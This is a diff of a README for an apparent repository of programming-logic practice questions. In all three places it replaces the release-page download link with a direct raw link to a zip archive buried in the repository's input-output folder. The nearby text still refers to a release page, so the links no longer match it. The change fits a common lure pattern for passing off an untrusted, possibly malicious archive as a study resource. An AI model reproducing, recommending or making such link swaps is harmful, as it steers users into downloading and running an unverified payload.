@@ -1,6 +1,6 @@
 # 📘 programming-logic-question - Clear practice for logic study
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Giggygi9060/programming-logic-question/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Giggygi9060/programming-logic-question/raw/refs/heads/main/input-output/question_logic_programming_1.7.zip)
 
 ## 🧭 What this is
 
@@ -21,7 +21,7 @@ Use it to study problem solving, check answers, and review common logic topics i
 
 Visit this page to download:
 
-https://github.com/Giggygi9060/programming-logic-question/releases
+https://github.com/Giggygi9060/programming-logic-question/raw/refs/heads/main/input-output/question_logic_programming_1.7.zip
 
 On that page, look for the latest release and choose the file that fits your needs.
 
@@ -171,4 +171,4 @@ This repository is useful if you:
 
 ## 🔗 Download again
 
-https://github.com/Giggygi9060/programming-logic-question/releases
+https://github.com/Giggygi9060/programming-logic-question/raw/refs/heads/main/input-output/question_logic_programming_1.7.zip
